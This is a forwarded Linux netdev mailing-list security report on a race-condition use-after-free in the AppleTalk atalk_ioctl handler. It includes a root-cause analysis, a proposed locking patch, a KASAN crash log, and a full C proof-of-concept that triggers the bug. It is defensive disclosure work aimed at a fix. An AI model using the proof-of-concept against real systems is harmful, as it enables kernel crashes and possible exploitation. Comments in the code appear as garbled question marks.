Return-Path: <netdev+bounces-38745-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 9189A7BC50E
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:37:50 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 9C53E1C2094B
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:37:49 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 86EB979D1;
	Sat,  7 Oct 2023 06:37:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dkim=none
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6962C746B
	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:37:45 +0000 (UTC)
Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 99963BD
	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:37:41 -0700 (PDT)
Received: (from willy@localhost)
	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976baQ8021177;
	Sat, 7 Oct 2023 08:37:36 +0200
Date: Sat, 7 Oct 2023 08:37:36 +0200
From: Willy Tarreau <w@1wt.eu>
To: netdev@vger.kernel.org
Cc: rootlab@huawei.com
Subject: Fwd: Race Condition Vulnerability in atalk_ioctl of nfc module
 leading to UAF
Message-ID: <20231007063736.GV20998@1wt.eu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_PASS,SPF_PASS autolearn=ham
	autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

Hello,

Sili Luo of Huawei sent this to the security list. Eric and I think it
does not deserve special handling from the security team and will be
better addressed here.

Regards,
Willy

PS: there are 6 reports for atalk in this series.

----- Forwarded message from rootlab <rootlab@huawei.com> -----

> Date: Sat, 7 Oct 2023 03:11:19 +0000
> From: rootlab <rootlab@huawei.com>
> Subject: Race Condition Vulnerability in atalk_ioctl of nfc module leading to UAF
> To: "security@kernel.org" <security@kernel.org>
> Delivered-To: security@kernel.org
> 
> I recently found an race condition Vulnerability in the atalk_ioctl, which leads to the kernel access free'd skb pointer.
> 
> The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
> 
> [Root Cause]
> 
> when cmd = TIOCINQ, atalk_ioctl whill obtain skb through skb_peek and then read skb->len to userspace.
> 
> atalk_ioctl don't hold any locks.
> 
> static int atalk_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
> {
>         int rc = -ENOIOCTLCMD;
>         struct sock *sk = sock->sk;
>         void __user *argp = (void __user *)arg;
> 
>         switch (cmd) {
>         case TIOCINQ: {
>                 struct sk_buff *skb = skb_peek(&sk->sk_receive_queue);
>                 long amount = 0;
>                 if (skb)
>                         amount = skb->len - sizeof(struct ddpehdr);
>                 rc = put_user(amount, (int __user *)argp);
>                 break;
>         }
> 
> 
> skb_peek returns the head node of the sk->sk_receive_queue linked list, but it does not increase the reference count of the skb.
> 
> static inline struct sk_buff *skb_peek(const struct sk_buff_head *list_)
> {
>         struct sk_buff *skb = list_->next;
> 
>         if (skb == (struct sk_buff *)list_)
>                 skb = NULL;
>         return skb;
> }
> 
> 
> atalk_recvmsg fetches the skb from sk->sk_receive_queue and then free the skb by skb_free_datagram.
> 
> static int atalk_recvmsg(struct sock *sk, struct msghdr *msg, size_t len,
>                       int flags, int *addr_len)
> {
>         struct sk_buff *skb = NULL;
>         skb = skb_recv_datagram(sk, flags, &rval);
>     lock_sock(sk);
>         .......
> 
>         skb_free_datagram(sk, skb);  // free skb
>     release_sock(sk);
>         return rval;
> }
> 
> 
> steps to trigger the bug:
> 
>   1.  thread A enter atalk_ioctl and get skb by skb_peek.
>   2.  thread B use atalk_recvmsg free the skb
>   3.  thread A read skb->len, but now skb has been released
> 
>                                          Time
>                                           +
>                                           |
>   thread A                                | thread B
>   atalk_ioctl                             | atalk_recvmsg
>                                           |
>     skb = skb_peek(&sk->sk_receive_queue) |
>                                           |
>                                           |
>                                           |     skb_free_datagram(sk, skb);  // free skb
>                                           |
>                                           |
>     amount = skb->len - xxx;              |
>                                           |
>                                           +
> 
> 
> [Patch Suggestion]
> 
> atalk_ioctl needs to obtain the sk->sk_receive_queue.lock when read skb.
> 
> From 6e1af54bd4045660a8f2f42e1628fdbbcfb47b79 Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 18:13:13 +0800
> Subject: [PATCH] appletalk: fix uaf in atalk_ioctl
> 
> hold sk->sk_receive_queue.lock in atalk_ioctl
> to prevent other thread free skb.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 3 ++-
>  1 file changed, 2 insertions(+), 1 deletion(-)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..219bf2e89814 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -1790,7 +1790,6 @@ static int atalk_recvmsg(struct socket *sock, struct msghdr *msg, size_t size,
>         return err ? : copied;
>  }
> 
> -
>  /*
>   * AppleTalk ioctl calls.
>   */
> @@ -1815,12 +1814,14 @@ static int atalk_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
>                  * These two are safe on a single CPU system as only
>                  * user tasks fiddle here
>                  */
> +               spin_lock_bh(&sk->sk_receive_queue.lock);
>                 struct sk_buff *skb = skb_peek(&sk->sk_receive_queue);
>                 long amount = 0;
> 
>                 if (skb)
>                         amount = skb->len - sizeof(struct ddpehdr);
>                 rc = put_user(amount, (int __user *)argp);
> +               spin_unlock_bh(&sk->sk_receive_queue.lock);
>                 break;
>         }
>         /* Routing */
> --
> 2.25.1
> 
> 
> 
> [Proof-of-Concept]
> 
> The POC is at the end of the email.
> 
> Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
> 
> To increase the probability of race, I add some loops to the race part of the code ( pn_ioctl ) to increase the time window.
> 
> the dxxx() function just do some loop to increase the time window.
> 
> From ac85eb34db26539370628277787ce5dacdae2186 Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 18:15:20 +0800
> Subject: [PATCH] appletalk: patch for race in atalk_ioctl
> 
> add some loops in the race code.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 15 +++++++++++++++
>  1 file changed, 15 insertions(+)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..6343fa64c413 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -1790,6 +1790,18 @@ static int atalk_recvmsg(struct socket *sock, struct msghdr *msg, size_t size,
>         return err ? : copied;
>  }
> 
> +#pragma GCC push_options
> +#pragma GCC optimize ("O0")
> +noinline u64 dxxx(void)
> +{
> +       u64 xxx = 0;
> +       for (size_t i = 0; i < 100000000; i++) {
> +               xxx *= 0x241;
> +               xxx += 0x1234;
> +       }
> +       return xxx;
> +}
> +#pragma GCC pop_options
> 
>  /*
>   * AppleTalk ioctl calls.
> @@ -1818,6 +1830,9 @@ static int atalk_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
>                 struct sk_buff *skb = skb_peek(&sk->sk_receive_queue);
>                 long amount = 0;
> 
> +               printk("vuln: [atalk_ioctl] %llx\n", (uint64_t)skb);
> +               dxxx();
> +
>                 if (skb)
>                         amount = skb->len - sizeof(struct ddpehdr);
>                 rc = put_user(amount, (int __user *)argp);
> --
> 2.25.1
> 
> 
> 
> panic log
> 
> # /tmp/skb_uaf
> fd: 3
> 22222
> [ 5267.635684] vuln: [atalk_sendmsg] sk:ffff88800b1d7000
> [ 5267.636647] vuln: [atalk_sendmsg] ffff8880079ea6c0
> [ 5268.085176] vuln: [atalk_sendmsg] do use ffff8880079ea6c0
> [ 5268.085946] [atalk_rcv]
> [ 5268.086133] [atalk_search_socket] iter sk ffff88800b1d7000 80 c 3
> Packet sent successfully.
> [ 5268.103226] vuln: [atalk_ioctl] ffff88800f53cb40
> [ 5268.122994] vuln: [atalk_recvmsg] sk:ffff88800b1d7000
> [ 5268.559316] ==================================================================
> [ 5268.559851] BUG: KASAN: slab-use-after-free in atalk_ioctl+0x1ce/0x210 [appletalk]
> [ 5268.560454] Read of size 4 at addr ffff88800f53cbb0 by task skb_uaf/363
> [ 5268.560926]
> [ 5268.561062] CPU: 1 PID: 363 Comm: skb_uaf Tainted: G           OE      6.5.0-rc5 #7
> [ 5268.561607] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
> [ 5268.562251] Call Trace:
> [ 5268.562438]  <TASK>
> [ 5268.562592]  dump_stack_lvl+0x4c/0x70
> [ 5268.562883]  print_report+0xd3/0x620
> [ 5268.563156]  ? kasan_complete_mode_report_info+0x7d/0x200
> [ 5268.563554]  ? atalk_ioctl+0x1ce/0x210 [appletalk]
> [ 5268.563917]  kasan_report+0xc2/0x100
> [ 5268.564182]  ? atalk_ioctl+0x1ce/0x210 [appletalk]
> [ 5268.564545]  __asan_load4+0x84/0xb0
> [ 5268.564805]  atalk_ioctl+0x1ce/0x210 [appletalk]
> [ 5268.565157]  sock_do_ioctl+0xb9/0x1a0
> [ 5268.565433]  ? hrtimer_active+0x86/0xc0
> [ 5268.565731]  ? __pfx_sock_do_ioctl+0x10/0x10
> [ 5268.566046]  ? hrtimer_try_to_cancel+0x74/0x1e0
> [ 5268.566378]  ? __pfx_hrtimer_try_to_cancel+0x10/0x10
> [ 5268.566732]  ? kfree+0x7a/0x120
> [ 5268.566980]  sock_ioctl+0x1b1/0x420
> [ 5268.567235]  ? __pfx_do_nanosleep+0x10/0x10
> [ 5268.567552]  ? __pfx_sock_ioctl+0x10/0x10
> [ 5268.567847]  ? hrtimer_nanosleep+0x129/0x220
> [ 5268.568159]  ? __pfx_hrtimer_nanosleep+0x10/0x10
> [ 5268.568494]  do_vfs_ioctl+0x42c/0xd00
> [ 5268.568755]  ? __pfx_do_vfs_ioctl+0x10/0x10
> [ 5268.569045]  ? get_timespec64+0xb6/0x110
> [ 5268.569318]  ? __pfx_get_timespec64+0x10/0x10
> [ 5268.569625]  ? __kmalloc_node+0x68/0x160
> [ 5268.569906]  ? __pfx_restore_fpregs_from_fpstate+0x10/0x10
> [ 5268.570288]  ? common_nsleep+0x6b/0x80
> [ 5268.570555]  ? __kasan_check_write+0x18/0x20
> [ 5268.570860]  ? switch_fpu_return+0x9f/0x150
> [ 5268.571156]  ? exit_to_user_mode_prepare+0x9b/0x190
> [ 5268.571509]  ? __rcu_read_unlock+0x5b/0x280
> [ 5268.571809]  ? __fget_light+0x1ca/0x1f0
> [ 5268.572087]  __x64_sys_ioctl+0x95/0x110
> [ 5268.572359]  do_syscall_64+0x60/0x90
> [ 5268.572616]  ? syscall_exit_to_user_mode+0x2a/0x50
> [ 5268.572952]  ? ret_from_fork+0x2d/0x70
> [ 5268.573218]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [ 5268.573576] RIP: 0033:0x45deab
> [ 5268.573800] Code: 0f 92 c0 84 c0 75 b0 49 8d 3c 1c e8 5f f3 02 00 85 c0 78 b1 48 83 c4 08 4c 89 e0 5b 41 5c c3 f3 0f 1e fa b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
> [ 5268.575054] RSP: 002b:00007fd74895bd98 EFLAGS: 00000202 ORIG_RAX: 0000000000000010
> [ 5268.575599] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000045deab
> [ 5268.576090] RDX: 00007fd74895bda0 RSI: 000000000000541b RDI: 0000000000000004
> [ 5268.576572] RBP: 00007fd74895bdb0 R08: 0000000000000000 R09: 00007fd74895c700
> [ 5268.577058] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffcc2ea134e
> [ 5268.577550] R13: 00007ffcc2ea134f R14: 00007ffcc2ea1350 R15: 00007fd74895be80
> [ 5268.578041]  </TASK>
> [ 5268.578208]
> [ 5268.578325] Allocated by task 361:
> [ 5268.578572]  kasan_save_stack+0x2a/0x50
> [ 5268.578859]  kasan_set_track+0x29/0x40
> [ 5268.579140]  kasan_save_alloc_info+0x1f/0x30
> [ 5268.579439]  __kasan_slab_alloc+0x91/0xa0
> [ 5268.579736]  kmem_cache_alloc_node+0x1a1/0x570
> [ 5268.580050]  __alloc_skb+0x1f0/0x270
> [ 5268.580310]  alloc_skb_with_frags+0x65/0x340
> [ 5268.580614]  sock_alloc_send_pskb+0x4e4/0x520
> [ 5268.580922]  atalk_sendmsg+0x403/0xc70 [appletalk]
> [ 5268.581286]  sock_sendmsg+0xef/0x100
> [ 5268.581537]  __sys_sendto+0x1bd/0x270
> [ 5268.581796]  __x64_sys_sendto+0x84/0xa0
> [ 5268.582066]  do_syscall_64+0x60/0x90
> [ 5268.582320]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [ 5268.582666]
> [ 5268.582780] Freed by task 362:
> [ 5268.582997]  kasan_save_stack+0x2a/0x50
> [ 5268.583272]  kasan_set_track+0x29/0x40
> [ 5268.583543]  kasan_save_free_info+0x2f/0x50
> [ 5268.583833]  __kasan_slab_free+0x12e/0x1c0
> [ 5268.584118]  kmem_cache_free+0x235/0x4f0
> [ 5268.584391]  kfree_skbmem+0x74/0xf0
> [ 5268.584641]  consume_skb+0x69/0x140
> [ 5268.584887]  skb_free_datagram+0x15/0x20
> [ 5268.585166]  atalk_recvmsg+0x17c/0x2b0 [appletalk]
> [ 5268.585513]  sock_recvmsg+0xfa/0x100
> [ 5268.585769]  __sys_recvfrom+0x161/0x230
> [ 5268.586039]  __x64_sys_recvfrom+0x84/0xa0
> [ 5268.586320]  do_syscall_64+0x60/0x90
> [ 5268.586575]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [ 5268.586923]
> [ 5268.587038] The buggy address belongs to the object at ffff88800f53cb40
> [ 5268.587038]  which belongs to the cache skbuff_head_cache of size 232
> [ 5268.587930] The buggy address is located 112 bytes inside of
> [ 5268.587930]  freed 232-byte region [ffff88800f53cb40, ffff88800f53cc28)
> [ 5268.588751]
> [ 5268.588866] The buggy address belongs to the physical page:
> [ 5268.589249] page:00000000b8b7362a refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xf53c
> [ 5268.589899] head:00000000b8b7362a order:1 entire_mapcount:0 nr_pages_mapped:0 pincount:0
> [ 5268.590444] flags: 0xfffffc0010200(slab|head|node=0|zone=1|lastcpupid=0x1fffff)
> [ 5268.590958] page_type: 0xffffffff()
> [ 5268.591211] raw: 000fffffc0010200 ffff888006aa4c80 dead000000000122 0000000000000000
> [ 5268.591752] raw: 0000000000000000 0000000080190019 00000001ffffffff 0000000000000000
> [ 5268.592267] page dumped because: kasan: bad access detected
> [ 5268.592647]
> [ 5268.592761] Memory state around the buggy address:
> [ 5268.593090]  ffff88800f53ca80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
> [ 5268.593584]  ffff88800f53cb00: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
> [ 5268.594075] >ffff88800f53cb80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> [ 5268.594567]                                      ^
> [ 5268.594897]  ffff88800f53cc00: fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc fc
> [ 5268.595392]  ffff88800f53cc80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
> [ 5268.595890] ==================================================================
> [ 5268.596403] Disabling lock debugging due to kernel taint
> use done
> [ 5269.598135] vuln: [atalk_release] sk:ffff88800b1d7000
> [ 5269.599386] vuln: [atalk_release] sk:ffff88800b1d5000
> #
> 
> 
> [CREDIT]
> 
> Sili Luo
> RO0T Lab of Huawei
> 
> poc
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <linux/atalk.h>
> #include <linux/if_tun.h>
> #include <net/if.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
> 
> #include <net/route.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <arpa/inet.h>
> #include <linux/if_packet.h>
> #include <net/ethernet.h>
> #include <netinet/if_ether.h>
> #include <netinet/in.h>
> #include <netinet/ip.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> 
> void pincpu(int cpu) {
>   cpu_set_t set;
>   CPU_ZERO(&set);
>   CPU_SET(cpu, &set);
>   if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
>     perror("setaffinity");
>   }
> }
> 
> int at_fd;
> 
> #define THREAD_NUMS 2
> pthread_barrier_t barrier;
> 
> #define ETH_P_X25 0x0805
> int xxx_raw_fd = 0;
> 
> void free_thread() {
>   pincpu(0);
> 
>   srand(time(NULL));
> 
>   struct sockaddr_at addr = {0};
>   addr.sat_family = AF_APPLETALK;    // ?????
>   addr.sat_addr.s_net = htons(0x20); // ????
>   addr.sat_addr.s_node = 0;
>   addr.sat_port = 0;
> 
>   usleep(35000);
> 
>   struct sockaddr_at ssa = {0};
> 
>   ssa.sat_addr.s_node = 0;
>   ssa.sat_addr.s_net = 0;
>   ssa.sat_family = PF_APPLETALK;
> 
>   char buf[200];
>   recvfrom(xxx_raw_fd, buf, 200, 0, (void *)&addr, sizeof(addr));
> }
> 
> void use_thread() {
>   pincpu(1);
>   uint64_t x;
>   usleep(15000);
>   ioctl(xxx_raw_fd, TIOCINQ, &x);
>   puts("use done");
> }
> 
> #include <linux/atalk.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <sys/types.h>
> struct aarp_packet {
>   uint16_t hardware_type;             /* ???? */
>   uint16_t protocol_type;             /* ???? */
>   uint8_t hardware_length;            /* ?????? */
>   uint8_t protocol_length;            /* ?????? */
>   uint16_t operation;                 /* ???? */
>   uint8_t sender_hardware_address[6]; /* ??????? */
>   uint8_t sender_protocol_address[4]; /* ??????? */
>   uint8_t target_hardware_address[6]; /* ?????? */
>   uint8_t target_protocol_address[4]; /* ?????? */
> };
> 
> int send3() {
>   /* ????? */
>   int sockfd = socket(AF_APPLETALK, SOCK_DGRAM, 0);
>   if (sockfd < 0) {
>     perror("socket error");
>     exit(EXIT_FAILURE);
>   }
> 
>   /* ????????????? */
>   struct sockaddr_at sa;
>   memset(&sa, 0, sizeof(sa));
>   sa.sat_family = AF_APPLETALK;
>   sa.sat_port = htons(0);
>   sa.sat_addr.s_net = 0x0000;
>   sa.sat_addr.s_node = 0x0000;
>   if (bind(sockfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
>     perror("bind error");
>     exit(EXIT_FAILURE);
>   }
> 
>   /* ?? AARP_REQUEST ?? */
>   struct aarp_packet packet;
>   memset(&packet, 0, sizeof(packet));
>   packet.hardware_type = htons(0);
>   packet.protocol_type = htons(1);
>   packet.hardware_length = 2;
>   packet.protocol_length = 3;
>   packet.operation = htons(4);
>   packet.sender_hardware_address[0] = 0x11;
>   packet.sender_hardware_address[1] = 0x22;
>   packet.sender_hardware_address[2] = 0x33;
>   packet.sender_hardware_address[3] = 0x44;
>   packet.sender_hardware_address[4] = 0x55;
>   packet.sender_hardware_address[5] = 0x66;
>   packet.sender_protocol_address[0] = 192;
>   packet.sender_protocol_address[1] = 168;
>   packet.sender_protocol_address[2] = 1;
>   packet.sender_protocol_address[3] = 1;
>   packet.target_hardware_address[0] = 0x00;
>   packet.target_hardware_address[1] = 0x00;
>   packet.target_hardware_address[2] = 0x00;
>   packet.target_hardware_address[3] = 0x00;
>   packet.target_hardware_address[4] = 0x00;
>   packet.target_hardware_address[5] = 0x00;
>   packet.target_protocol_address[0] = 192;
>   packet.target_protocol_address[1] = 168;
>   packet.target_protocol_address[2] = 1;
>   packet.target_protocol_address[3] = 2;
> 
>   /* ?? AARP_REQUEST ?? */
>   struct sockaddr_at dest;
>   memset(&dest, 0, sizeof(dest));
>   dest.sat_family = AF_APPLETALK;
>   dest.sat_port = htons(0);
>   dest.sat_addr.s_net = htons(0x20);
>   dest.sat_addr.s_node = 0x0000;
>   if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&dest,
>              sizeof(dest)) < 0) {
>     perror("sendto error");
>     exit(EXIT_FAILURE);
>   }
> 
>   /* ????? */
>   close(sockfd);
> 
>   return 0;
> }
> 
> int send_pkt2() {
> 
>   int sockfd;
>   struct sockaddr_ll sa;
>   struct ether_header eth_header;
>   struct iphdr ip_header;
>   char packet[ETH_FRAME_LEN];
>   char *interface = "lo"; // Replace with your desired interface name
> 
>   // Create socket
>   sockfd = socket(PF_APPLETALK, SOCK_RAW, htons(ETH_P_ATALK));
>   xxx_raw_fd = sockfd;
>   if (sockfd == -1) {
>     perror("socket");
>     return 1;
>   }
> 
>   // Set interface index
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = PF_APPLETALK;
>   sa.sll_protocol = htons(ETH_P_ATALK);
>   sa.sll_ifindex = if_nametoindex(interface);
> 
>   struct sockaddr_at ssa = {0};
> 
>   ssa.sat_addr.s_node = 0;
>   ssa.sat_addr.s_net = htons(0x20);
>   ssa.sat_family = PF_APPLETALK;
>   ssa.sat_port = 0x80;
> 
>   // Set Ethernet header
>   memset(&eth_header, 0, sizeof(struct ether_header));
>   eth_header.ether_shost[0] = 0x00; // Source MAC address
>   eth_header.ether_shost[1] = 0x11;
>   eth_header.ether_shost[2] = 0x22;
>   eth_header.ether_shost[3] = 0x33;
>   eth_header.ether_shost[4] = 0x44;
>   eth_header.ether_shost[5] = 0x55;
>   eth_header.ether_dhost[0] = 0x66; // Destination MAC address
>   eth_header.ether_dhost[1] = 0x77;
>   eth_header.ether_dhost[2] = 0x88;
>   eth_header.ether_dhost[3] = 0x99;
>   eth_header.ether_dhost[4] = 0xAA;
>   eth_header.ether_dhost[5] = 0xBB;
>   eth_header.ether_type = htons(ETH_P_ATALK);
> 
>   // Set IP header
>   memset(&ip_header, 0x22, sizeof(struct iphdr));
> 
>   memcpy(packet, &eth_header, sizeof(struct ether_header));
> 
>   uint8_t *ptr = packet + sizeof(struct ether_header);
> 
>   *(uint64_t *)ptr = 0x11223344;
> 
>   // Send the packet
>   if (sendto(sockfd, packet, sizeof(struct ether_header) + 4, 0,
>              (struct sockaddr *)&ssa, sizeof(struct sockaddr_ll)) == -1) {
>     perror("sendto");
>     return 1;
>   }
> 
>   printf("Packet sent successfully.\n");
>   return 0;
> }
> 
> int main() {
>   struct ifreq atreq = {0};
> 
>   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
>   printf("fd: %d\n", at_fd);
> 
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at *sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange *nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> 
>   sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   nr->nr_lastnet = htons(0x21);
>   nr->nr_firstnet = htons(0x20);
> 
>   ioctl(at_fd, SIOCSIFADDR, &atreq);
> 
>   struct rtentry rt = {0};
>   char name[] = "lo";
>   rt.rt_dev = name;
> 
>   struct sockaddr_at *ta = (struct sockaddr_at *)&rt.rt_dst;
>   struct sockaddr_at *ga = (struct sockaddr_at *)&rt.rt_gateway;
>   ta->sat_family = AF_APPLETALK;
>   ga->sat_family = AF_APPLETALK;
>   ta->sat_addr.s_net = 0x33;
>   ta->sat_addr.s_node = 0x32;
>   // ioctl(at_fd, SIOCADDRT, &rt);
> 
>   struct sockaddr_at addr = {0};
>   addr.sat_family = AF_APPLETALK;    // ?????
>   addr.sat_addr.s_net = htons(0x20); // ????
>   addr.sat_addr.s_node = 0;
>   addr.sat_port = 0;
>   int bind_res = bind(at_fd, (struct sockaddr *)&addr, sizeof(addr));
> 
>   puts("22222");
>   send_pkt2();
> 
>   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
> 
>   pthread_t ids[2] = {0};
>   pthread_create(&ids[0], NULL, (void *)free_thread, NULL);
>   pthread_create(&ids[1], NULL, (void *)use_thread, NULL);
> 
>   pthread_join(ids[0], NULL);
>   pthread_join(ids[1], NULL);
> 
>   sleep(1);
> }
> 
> 

----- End forwarded message -----

